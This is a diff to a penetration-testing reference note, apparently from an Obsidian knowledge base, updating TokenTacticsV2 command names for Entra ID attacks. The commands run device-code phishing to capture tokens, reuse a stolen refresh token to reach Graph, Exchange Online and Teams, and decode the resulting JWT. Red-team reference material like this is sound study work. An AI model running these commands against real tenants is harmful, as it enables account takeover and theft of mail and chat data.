@@ -11,16 +11,20 @@ git clone https://github.com/f-bader/TokenTacticsV2
 Import-Module .\TokenTacticsV2\TokenTacticsV2.psd1
 ```
 
+> [!warning] **Two forks, two vocabularies — match commands to the module you loaded (verified 2026-09-27).** The commands below are the **maintained f-bader/TokenTacticsV2** names (what the install above pulls). The **original rvrsh3ll/TokenTactics** instead uses `Get-AzureToken -Client MSGraph -Device`, `RefreshTo-<Resource>Token`, and `ConvertFrom-JWT` — don't mix the two sets.
+
 ```powershell
-# Device code phishing — get an initial token
-Get-AzureToken -Client MSGraph -Device
+# Device code phishing — get an initial token  (V2: Get-EntraIDTokenFromDeviceCode)
+Get-EntraIDTokenFromDeviceCode -Client MSGraph
 
-# Refresh a token / swap to a different resource with the same refresh token
-RefreshTo-MSGraphToken -domain <domain> -refreshToken $response.refresh_token
-RefreshTo-AzureCoreManagementToken -domain <domain> -refreshToken $response.refresh_token
+# Swap a refresh token to another resource — generic form (-Client + -Domain), or a
+# per-resource Invoke-RefreshTo<Resource>Token function:
+Invoke-RefreshToToken -Client MSGraph -Domain <domain> -RefreshToken $response.refresh_token
+Invoke-RefreshToOutlookToken -Domain <domain> -RefreshToken $response.refresh_token   # Exchange Online
+Invoke-RefreshToMSTeamsToken -Domain <domain> -RefreshToken $response.refresh_token   # Teams
 
-# Decode a JWT for inspection
-ConvertFrom-JWT -token $response.access_token
+# Decode a JWT for inspection  (V2: ConvertFrom-JWTtoken)
+ConvertFrom-JWTtoken -Token $response.access_token
 ```
 
 > [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Token Theft & Abuse and FOCI Abuse sections — this tool automates the manual `curl` refresh-token exchanges shown there.
@@ -29,5 +33,5 @@ ConvertFrom-JWT -token $response.access_token
 ---
 
 *Created: 2026-07-27*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-27*
+*Model: claude-opus-4-8*
